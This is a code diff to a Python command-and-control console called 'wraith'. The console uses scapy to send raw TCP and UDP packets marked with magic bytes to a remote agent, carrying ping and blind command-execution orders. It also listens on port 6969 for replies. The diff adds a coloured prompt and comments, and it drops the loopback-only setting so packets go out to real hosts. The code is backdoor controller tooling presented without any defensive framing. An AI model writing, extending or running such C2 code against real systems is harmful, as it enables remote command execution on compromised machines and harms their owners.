@@ -9,6 +9,10 @@ MAGIC_BYTES = 0x0b1e55ed
 C2_PORT = 6969
 CMD_MAP = {"CMD_PING" : 0x01, "CMD_EXEC_BLIND" : 0x02}
 
+PURPLE = "\033[95m"
+RESET  = "\033[0m"
+PROMPT = f"{PURPLE}wraith>{RESET} "
+
 def send_packet_TCP(cmd, cmd_type, agent_ip, port):
 
     print("Sending via TCP")
@@ -21,17 +25,21 @@ def send_packet_TCP(cmd, cmd_type, agent_ip, port):
     # Craft a raw TCP packet
     pkt = IP(dst=agent_ip) / TCP(dport=port, sport=54321, flags="PA") / Raw(load=packet)
 
-    send(pkt, iface="lo")
+    send(pkt, verbose=False)
 
 def send_packet_UDP(cmd, cmd_type, agent_ip, port):
 
     print("Sending via UDP")
+    # Assemble header, which is [MAGIC][CMD TYPE][CMD LENGTH] all in big endian
     packet = struct.pack(">III", MAGIC_BYTES, CMD_MAP[cmd_type], len(cmd))
+
+    # Add on payload (the cmd)
     packet += cmd.encode()
 
+    # Craft a raw UDP packet
     pkt = IP(dst=agent_ip) / UDP(dport=port, sport=54321) / Raw(load=packet)
 
-    send(pkt, iface="lo")
+    send(pkt, verbose=False)
 
 def start_listener():
 
@@ -66,7 +74,7 @@ def start_listener():
             if message == "pong":
                 print(f"\n[+] Pong received from {addr[0]}")
 
-            print("wraith> ", end="", flush=True)
+            print(PROMPT, end="", flush=True)
 
     # Thread the accept loop
     t = threading.Thread(target=_accept_loop, daemon=True)
@@ -86,7 +94,7 @@ def shell():
 
     while True:
         try:
-            input_command = input("wraith> ").strip()
+            input_command = input(PROMPT).strip()
         except (EOFError, KeyboardInterrupt) as e:
             print(e)
 
